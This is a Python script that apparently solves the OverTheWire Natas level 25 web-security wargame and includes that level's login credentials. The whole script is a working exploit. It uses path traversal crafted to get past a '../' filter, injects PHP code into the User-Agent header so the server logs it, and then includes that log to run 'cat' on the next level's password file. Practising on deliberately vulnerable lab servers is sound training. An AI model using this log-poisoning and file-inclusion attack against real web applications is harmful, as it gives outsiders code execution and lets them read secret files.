import requests as req

username = "natas25"
password = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"
url = "http://natas25.natas.labs.overthewire.org/"

session = req.Session()

# header dict: this will replace the user-agent with our php executable code
modHeader = {"User-Agent": "<?php system('cat /etc/natas_webpass/natas26'); ?>"}

response = session.post(url, data={"lang": "..././..././..././"}, auth=(username, password))
print(response.text)
print('*'*30)
sid = session.cookies['PHPSESSID']
reponse = session.post(url, headers=modHeader, data={"lang": "..././..././..././..././..././var/www/natas/natas25/logs/natas25_"+sid+".log"}, auth=(username, password))
print(reponse.text)